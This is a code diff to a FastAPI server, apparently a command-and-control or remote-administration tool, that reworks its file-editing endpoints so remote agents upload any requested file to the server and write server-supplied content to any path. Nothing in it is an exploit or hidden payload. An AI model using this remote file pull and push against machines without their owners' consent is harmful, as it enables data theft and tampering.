@@ -4,13 +4,17 @@ Handles creating and managing commands sent from server to agents
 """
 
 import os
+import asyncio
+import json
+from pathlib import Path
 from typing import Dict
 from fastapi import APIRouter, HTTPException, Depends
 
 from core.agent import Agent
 from config import agents, UPLOAD_DIR
 from dependencies import get_current_user
-from models import WriteFileRequest
+from models import EditFileWriteRequest
+from utils.encoding import detect_file_encoding
 
 
 router = APIRouter(prefix="", tags=["commands"])
@@ -172,55 +176,177 @@ def create_set_sleep_time_command(agent_id: int, sleep_time: int, user: Dict = D
     }
 
 
-@router.post("/command/{agent_id}/read_file")
-def create_read_file_command(agent_id: int, path: str, max_size: int = 10 * 1024 * 1024, user: Dict = Depends(get_current_user)):
+@router.post("/command/{agent_id}/edit_file/read")
+async def edit_file_read(
+    agent_id: int,
+    path: str,
+    timeout: int = 30,
+    user: Dict = Depends(get_current_user)
+):
     """
-    Create a read_file command - agent will read file content for editing
+    Read a file for editing by using the upload command.
+    Agent uploads file → Server detects encoding → Returns decoded content
 
     Args:
         agent_id: The agent ID
-        path: The file path to read
-        max_size: Maximum file size in bytes (default 10MB)
+        path: File path on agent's machine to read
+        timeout: Maximum time to wait for upload (default 30 seconds)
+
+    Returns:
+        {
+            'content': str,      # Decoded file content
+            'encoding': str,     # Detected encoding
+            'size': int,         # File size in bytes
+            'is_binary': bool    # Whether file is binary
+        }
     """
     if agent_id not in agents:
         raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
 
     ag: Agent = agents[agent_id]
-    command_id = ag.add_command("read_file", {
-        "path": path,
-        "max_size": max_size
+
+    # Create upload command with a temporary filename
+    filename = f"temp_edit_{agent_id}_{os.path.basename(path)}"
+    command_id = ag.add_command("upload", {
+        "source_path": path,
+        "filename": filename
     })
-    return {
-        'command_id': command_id,
-        'type': 'read_file',
-        'status': 'queued',
-        'message': f'Agent will read file: {path}'
-    }
+
+    # Wait for upload to complete
+    max_attempts = timeout * 2  # Poll every 0.5 seconds
+    attempts = 0
+
+    while attempts < max_attempts:
+        await asyncio.sleep(0.5)
+        attempts += 1
+
+        result = ag.get_result(command_id)
+        if result and result.get('status') == 'completed':
+            # Upload successful - now read the file and detect encoding
+            agent_dir = UPLOAD_DIR / f"agent_{agent_id}"
+            file_path = agent_dir / filename
+
+            if not file_path.exists():
+                raise HTTPException(status_code=500, detail="File upload completed but file not found")
+
+            try:
+                # Read file content as binary
+                with open(file_path, 'rb') as f:
+                    file_content = f.read()
+
+                # Detect encoding and decode
+                decoded_content, encoding, is_binary = detect_file_encoding(file_content, path)
+
+                # Delete temporary file
+                file_path.unlink()
+
+                return {
+                    'content': decoded_content,
+                    'encoding': encoding,
+                    'size': len(file_content),
+                    'is_binary': is_binary
+                }
+            except Exception as e:
+                # Clean up on error
+                if file_path.exists():
+                    file_path.unlink()
+                raise HTTPException(status_code=500, detail=f"Error processing file: {str(e)}")
+
+        elif result and result.get('status') == 'failed':
+            error_msg = result.get('error', 'Unknown error')
+            raise HTTPException(status_code=500, detail=f"Agent failed to upload file: {error_msg}")
+
+    raise HTTPException(status_code=408, detail=f"Timeout waiting for file upload (agent may be offline)")
 
 
-@router.post("/command/{agent_id}/write_file")
-def create_write_file_command(agent_id: int, request: WriteFileRequest, user: Dict = Depends(get_current_user)):
+@router.post("/command/{agent_id}/edit_file/write")
+async def edit_file_write(
+    agent_id: int,
+    request: EditFileWriteRequest,
+    user: Dict = Depends(get_current_user)
+):
     """
-    Create a write_file command - agent will write content to file
+    Write edited file content by saving to server then using download command.
+    Server saves content → Creates download command → Agent downloads and writes
 
     Args:
         agent_id: The agent ID
-        request: WriteFileRequest with path and content
+        request: EditFileWriteRequest with path, content, encoding, and timeout
+
+    Returns:
+        {
+            'status': 'success',
+            'message': str,  # Success message from agent
+            'size': int      # File size written
+        }
     """
     if agent_id not in agents:
         raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
 
     ag: Agent = agents[agent_id]
-    command_id = ag.add_command("write_file", {
-        "path": request.path,
-        "content": request.content
-    })
-    return {
-        'command_id': command_id,
-        'type': 'write_file',
-        'status': 'queued',
-        'message': f'Agent will save file: {request.path}'
-    }
+
+    # Create agent directory if needed
+    agent_dir = UPLOAD_DIR / f"agent_{agent_id}"
+    agent_dir.mkdir(exist_ok=True)
+
+    # Save content to temporary file with specified encoding
+    filename = f"temp_edit_{agent_id}_{os.path.basename(request.path)}"
+    file_path = agent_dir / filename
+
+    try:
+        # Encode and save file
+        encoded_content = request.content.encode(request.encoding)
+        with open(file_path, 'wb') as f:
+            f.write(encoded_content)
+
+        # Create download command
+        command_id = ag.add_command("download", {
+            "url": f"/files/agent_{agent_id}/{filename}",
+            "save_as": request.path
+        })
+
+        # Wait for download to complete
+        max_attempts = request.timeout * 2  # Poll every 0.5 seconds
+        attempts = 0
+
+        while attempts < max_attempts:
+            await asyncio.sleep(0.5)
+            attempts += 1
+
+            result = ag.get_result(command_id)
+            if result and result.get('status') == 'completed':
+                # Download successful - clean up temporary file
+                if file_path.exists():
+                    file_path.unlink()
+
+                return {
+                    'status': 'success',
+                    'message': result.get('result', 'File saved successfully'),
+                    'size': len(encoded_content)
+                }
+
+            elif result and result.get('status') == 'failed':
+                # Clean up on failure
+                if file_path.exists():
+                    file_path.unlink()
+                error_msg = result.get('error', 'Unknown error')
+                raise HTTPException(status_code=500, detail=f"Agent failed to save file: {error_msg}")
+
+        # Timeout - clean up
+        if file_path.exists():
+            file_path.unlink()
+        raise HTTPException(status_code=408, detail=f"Timeout waiting for file save (agent may be offline)")
+
+    except UnicodeEncodeError as e:
+        # Clean up on encoding error
+        if file_path.exists():
+            file_path.unlink()
+        raise HTTPException(status_code=400, detail=f"Encoding error: Cannot encode content as {request.encoding}: {str(e)}")
+    except Exception as e:
+        # Clean up on any other error
+        if file_path.exists():
+            file_path.unlink()
+        raise HTTPException(status_code=500, detail=f"Error saving file: {str(e)}")
 
 
 @router.post("/command/{agent_id}/delete")
